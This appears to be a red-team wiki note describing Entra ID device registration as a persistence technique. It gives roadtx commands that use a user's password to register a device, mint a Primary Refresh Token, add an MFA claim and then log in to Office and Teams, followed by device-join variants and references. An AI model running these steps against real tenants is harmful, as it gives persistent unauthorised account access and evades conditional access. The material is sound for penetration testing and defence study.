---
title: Device Registration
---

Register a new device to obtain a [[notes/entra/prt]] as [[notes/entra/index]] [[notes/mitre-attack/persistence]] technique.

Get an authentication token for the device registration service.
This might require MFA, but often doesn't.

~~~ bash
roadtx gettokens -u john.doe@corp.com -p 'passw0rd' -r devicereg
~~~

Register a new device.

~~~ bash
roadtx device -n pentest1
~~~

Get a PRT for the device.
If device registration is possible without MFA the resulting PRT will miss the MFA claim.

~~~ bash
roadtx prt -u john.doe@corp.com -p 'passw0rd' --key-pem ./pentest1.key --cert-pem ./pentest1.pem
~~~

Do interactive MFA to add the MFA claim to the PRT.

~~~ bash
roadtx prtenrich
~~~

Use the PRT to browse a website as authenticated user.

~~~ bash
roadtx browserprtauth -url https://office.com
~~~

Authenticate with the PRT as Microsoft Teams client.

~~~ bash
roadtx prtauth -c msteams -r msgraph
~~~

Device registration variants ([source](https://twitter.com/lukasberancz/status/1629786547208740864)):

- Azure AD joined
    - Windows 10, Windows 11 or Windows Server 2019, Server 2022 running as Azure VM
    - corporate device
    - managed trough Intune or SCCM
    - PRT obtained via Cloud Authentication Provider (CloudAP)
- Azure AD registered
    - BOYD devices, often phones
    - supported by Windows 10, Windows 11, macOS, Ubuntu and mobile devices
    - PRT obtained via WAM
- Azure AD Hybrid Join
    - corporate device
    - joined to on-prem AD and registered on AAD
    - all Windows desktop and server versions
    - PRT obtained via CloudAP

References:

- [Automating Azure AD authentication, Primary Refresh Token (ab)use and device registration](http://web.archive.org/web/20221109155717/https://dirkjanm.io/introducing-roadtools-token-exchange-roadtx/), introduction of `roadtx`
- [RoadTX Wiki](https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx))
- [Bypassing conditional access by faking device compliance](http://web.archive.org/web/20230110065457/https://aadinternals.com/post/mdm/)
